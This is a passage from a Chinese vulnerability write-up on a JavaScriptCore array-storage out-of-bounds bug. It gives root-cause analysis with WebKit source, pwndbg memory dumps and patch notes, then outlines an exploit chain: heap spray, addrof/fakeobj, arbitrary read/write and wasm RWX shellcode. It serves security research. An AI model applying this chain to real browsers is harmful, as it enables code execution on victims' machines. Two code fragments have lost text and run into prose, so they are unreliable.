@@ -1,0 +1,125 @@
+    pwndbg> x/6xg 0x7ff0000fe6e8-0x10
+    0x7ff0000fe6d8: 0x00000000badbeef0  0x0000000100100000
+    0x7ff0000fe6e8: 0x0000000000000000  0x0000000100000000
+    0x7ff0000fe6f8: 0xffff000000000001  0x00000000badbeef0
+    pwndbg>  p *(JSC::ArrayStorage *) 0x7ff0000fe6e8
+    $8 = {
+      m_sparseMap = {
+         >> = {
+          m_cell = 0x0
+        }, }, 
+      m_indexBias = 0, 
+      m_numValuesInVector = 1, 
+      m_vector = {{
+           >> = {
+            m_value = -281474976710655
+          }, }}
+    }
+然后继续判断会调用到holesMustForwardToPrototype
+    bool Structure::holesMustForwardToPrototype(VM& vm, JSObject* base) const
+    {
+        ASSERT(base->structure(vm) == this);
+        if (this->mayInterceptIndexedAccesses())
+            return true;
+        JSValue prototype = this->storedPrototype(base);
+        if (!prototype.isObject())
+            return false;
+        JSObject* object = asObject(prototype);
+        while (true) {
+            Structure& structure = *object->structure(vm);
+            if (hasIndexedProperties(object->indexingType()) || structure.mayInterceptIndexedAccesses())
+                return true;
+            prototype = structure.storedPrototype(object);
+            if (!prototype.isObject())
+                return false;
+            object = asObject(prototype);
+        }
+        RELEASE_ASSERT_NOT_REACHED();
+        return false;
+    }
+holesMustForwardToPrototype中主要是遍历了array的原型链并判断了hasIndexedProperties和mayInterceptIndexedAccesses属性，如果这两个属性都为假会返回false。
+回到shiftCountWithArrayStorage的3个判断，即
+    if ((storage->hasHoles() && this->structure(vm)->holesMustForwardToPrototype(vm, this)) 
+            || hasSparseMap() 
+            || shouldUseSlowPut(indexingType()))
+按照lokihardt的说法由于poc中的arr在原型链中不含索引访问和proxy对象，第一个&&的判断中holesMustForwardToPrototype会为假。其余两个判断也为假。这样就导致shiftCountWithArrayStorage执行到如下代码
+    storage->m_numValuesInVector -= count;
+poc中的`arr->m_numValuesInVector =
+1`，这样删除0x11个元素后`1-0x11=0xFFFFFFFFFFFFFFF0`，保存时取低4字节为`0xfffffff0`。
+poc中执行到arr.splice(0xfffffff0, 0,
+1)添加元素时使用的是unshift，并最终由于arr类型为ArrayWithArrayStorage调用到unshiftCountWithArrayStorage。
+    bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage)
+    {
+    ......
+        // If the array contains holes or is otherwise in an abnormal state,
+        // use the generic algorithm in ArrayPrototype.
+        if (storage->hasHoles() || storage->inSparseMode() || shouldUseSlowPut(indexingType()))
+            return false;
+在unshiftCountWithArrayStorage中首先判断了arr的storage是否hasHoles，如果hasHoles为真则使用ArrayPrototype的其他方法去处理splice调用时删除或添加的元素。
+由于poc中我们修改了arr的length为0xFFFFFFF0，又由于第一次调用splice方法删除元素时在shiftCountWithArrayStorage中不正确地更新了m_numValuesInVector，此时`length=m_numValuesInVector=0xFFFFFFF0`，`storage->hasHoles()`返回为假jsc继续使用unshiftCountWithArrayStorage的方法处理splice调用中添加的元素。此时butterfly(0x7ff0000fe6e8)如下，`\*(dword\*)(&butterfly+0xc)==\*(dword\*)(&butterfly-0x4)`
+    pwndbg> p *(JSC::ArrayStorage *)0x7ff0000fe6e8
+    $4 = {
+      m_sparseMap = {
+         >> = {
+          m_cell = 0x0
+        }, }, 
+      m_indexBias = 0, 
+      m_numValuesInVector = 4294967280, 
+      m_vector = {{
+           >> = {
+            m_value = 0
+          }, }}
+    }
+    pwndbg> x/6xg 0x7ff0000fe6e8-0x10
+    0x7ff0000fe6d8: 0x00000000badbeef0  0x00000001fffffff0
+    0x7ff0000fe6e8: 0x0000000000000000  0xfffffff000000000
+    0x7ff0000fe6f8: 0x0000000000000000  0x00000000badbeef0
+unshiftCountWithArrayStorage随后设置了storage的gc状态为推迟，然后重新设置了array->storage。随后的漏洞利用分析中可以看到这里调用memmove处理新的storage就是导致OOB的根本原因。
+        WriteBarrier* vector = storage->m_vector;
+        if (startIndex) {
+            if (moveFront)
+                memmove(vector, vector + count, startIndex * sizeof(JSValue));
+            else if (length - startIndex)
+                memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));
+        }
+        for (unsigned i = 0; i hasHoles判断为假，进而在unshiftCountWithArrayStorage中使用memmove更新storage时导致OOB。
+#### patch分析
+patch地址:
+patch中去掉了shiftCountWithArrayStorage中遍历原型链的判断，且不管array是否storage->hasHoles()都使用memmove去更新storage。这样在调用splice删除元素时只要数组vectorLength!=storageLength即hasHoles为真都会使用ArrayPrototype中的方法去处理，不会更新m_numValuesInVector
+，这样这个漏洞就从根源上被修复了。
+但是这里我没有想明白的一点是为什么修复漏洞之前还要多此一举的调用holesMustForwardToPrototype判断array的原型链，既然不判断既没有漏洞又省去了一次执行判断原型链的时间。
+### 漏洞利用
+exp来自那个男人，即lokihardt。
+首先整理一下通过这个漏洞我们可控的东西：splice在删除元素时不正确更新的vectorLength、array数组的长度storageLength，在调用splice添加元素时如果vectorLength=storageLength即storage->hasHoles为真会执行unshiftCountWithArrayStorage中更新storage的流程，并且更新storage的流程memmove时似乎存在利用的可能。
+lokihardt的利用思路是通过堆喷利用unshiftCountWithArrayStorage更新storage时memmove修改数组长度构成OOB进而构造addrof、fakeobj原语，构造ArrayWithArrayStorage类型的fakeobj记hax并使hax的butterfly指向ArrayWithDouble类型的victim，通过修改hax[1]即victim.butterfly为addr和victim.prop完成任意地址读写，通过任意地址读写修改wasm模块rwx的内存区来执行shellcode。
+#### heap spray
+    let spray = new Array(0x3000);
+    for (let i = 0; i  Object: 0x7fffb30b4370 with butterfly 0x7fe0000fe928 (Structure 0x7fffb30f2a70:[Array, {}, ArrayWithDouble, Proto:0x7fffb30c80a0, Leaf]), StructureID: 98
+    pwndbg> x/6xg 0x7fffb30b4370
+    0x7fffb30b4370: 0x0108210700000062  0x00007fe0000fe928
+    0x7fffb30b4380: 0x0108210900000063  0x00007fe0000fe948
+    0x7fffb30b4390: 0x00000000badbeef0  0x00000000badbeef0
+    pwndbg> x/6xg 0x00007fe0000fe928-0x10
+    0x7fe0000fe918: 0x00007fffb306c280  0x0000000100000001
+    0x7fe0000fe928: 0x402abd70a3d70a3d  0x00000000badbeef0
+    0x7fe0000fe938: 0x00000000badbeef0  0x0000000300000001
+可以看到a1即ArrayWithDouble的元素在butterfly的storage中直接存储。
+a2为ArrayWithContiguous类型，jsc中存储如下
+    [*] a2
+    --> Object: 0x7fffb30b4380 with butterfly 0x7fe0000fe948 (Structure 0x7fffb30f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7fffb30c80a0]), StructureID: 99
+    pwndbg> x/6xg 0x7fffb30b4380
+    0x7fffb30b4380: 0x0108210900000063  0x00007fe0000fe948
+    0x7fffb30b4390: 0x00000000badbeef0  0x00000000badbeef0
+    0x7fffb30b43a0: 0x00000000badbeef0  0x00000000badbeef0
+    pwndbg> x/6xg 0x00007fe0000fe948-0x10
+    0x7fe0000fe938: 0x00000000badbeef0  0x0000000300000001
+    0x7fe0000fe948: 0x00007fffb30b0080  0x0000000000000000
+    0x7fe0000fe958: 0x0000000000000000  0x00000000badbeef0
+    pwndbg> x/6xg 0x00007fffb30b0080-0x10
+    0x7fffb30b0070: 0x0000000000000004  0x00000000badbeef0
+    0x7fffb30b0080: 0x010016000000004c  0x0000000000000000
+    0x7fffb30b0090: 0x0000000000000000  0x0000000000000000
+a2中的元素{}在butterfly中以类似object的形式存储，即butterfly中存储的是指向{}内存区的指针，指针指向a2的真正内容。即`a2.butterfly->*p->content`。
+再看一遍lokihardt堆喷的数组，spray[i]为ArrayWithDouble，butterfly:0x7fe00028c078,spray[i+1]为ArrayWithContiguous，butterfly:0x7fe00028c0e8。
+    pwndbg> x/40xg 0x00007fe00028c078-0x40
+    0x7fe00028c038: 0x00007fffb1a65c40  0x00007fffb1a65c80
